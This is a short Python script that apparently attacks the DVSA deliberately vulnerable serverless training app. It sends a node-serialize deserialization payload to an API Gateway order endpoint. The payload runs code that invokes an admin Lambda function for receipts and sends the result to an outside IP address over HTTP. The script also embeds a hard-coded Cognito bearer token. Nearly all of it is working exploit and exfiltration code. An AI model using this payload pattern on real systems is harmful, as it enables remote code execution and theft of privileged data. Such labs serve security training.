import requests

headers = {
    'Authorization': 'eyJraWQiOiJHYjNJQzQ3U2FjRTBCelNSTEM1c1JVWXF0eW9USGdwWkRrdFwvYzdXVW4wcz0iLCJhbGciOiJSUzI1NiJ9.eyJzdWIiOiI0NDEwYThkNC1mM2E5LTQzYzQtOWM2MC0wNjFiMTY3NjdhNjEiLCJldmVudF9pZCI6ImE1YzlmZmI5LTUwN2UtNDIyYS05ZmI1LTZkNjkwYTZjMmRiZCIsInRva2VuX3VzZSI6ImFjY2VzcyIsInNjb3BlIjoiYXdzLmNvZ25pdG8uc2lnbmluLnVzZXIuYWRtaW4iLCJhdXRoX3RpbWUiOjE1ODkwNDIxNjEsImlzcyI6Imh0dHBzOlwvXC9jb2duaXRvLWlkcC51cy1lYXN0LTEuYW1hem9uYXdzLmNvbVwvdXMtZWFzdC0xX01ZYTZuSUFqRiIsImV4cCI6MTU4OTA0NTc2MSwiaWF0IjoxNTg5MDQyMTYxLCJqdGkiOiIxOTIyM2M0NC04NTk5LTQzODUtOTBlYS1hODI4Nzc0MTRkZjciLCJjbGllbnRfaWQiOiIzYWJoOW4yOTV0aTBycWlrM2k1M2o0aW1vcSIsInVzZXJuYW1lIjoiNDQxMGE4ZDQtZjNhOS00M2M0LTljNjAtMDYxYjE2NzY3YTYxIn0.bsZkO61difhWShVRXzV1jebxHu9BZggp9zknN7e-RLJv72jo1nxaRzVOCAxRh16vx7axLXkafkxAKOkS567Nnh0YKPS8r8AoAR8NIFDYKajgrmeK3W2gxxExXDDC_FIc6QaNUZX2B1BzQ0MAkSLyZqHYLg6oHPtN7LSNC4LY6NKYrK0WiWDu0YYTerZxn334-fTxPvPr3l_wH-_Zd2eKXovlRhwpSl_MAK9gR-X2KvZEC4-aONHYtKhTGTPHdbQn4gDiYUNTRtTIx7Jf3ibHDg_sP7d4NenTkEtc12ZXhVuZzuJe19CSWStQCGM8i4pItkaI6EcFHOZO-qcMAVKMRA'
}

response = requests.post('https://ni9ahapg8h.execute-api.us-east-1.amazonaws.com/dev/order', headers=headers, json={"action": "_$$ND_FUNC$$_function(){var aws=require(\"aws-sdk\");var lambda=new aws.Lambda();var p = {FunctionName: \"DVSA-ADMIN-GET-RECEIPT\", InvocationType: \"RequestResponse\", Payload: JSON.stringify({\"year\": \"2020\", \"month\": \"04\"})};lambda.invoke(p,function(e,d){ var h=require(\"http\");h.get(\"http://92.222.72.208\"+JSON.stringify(d));}); }()"})

print(response.request.body)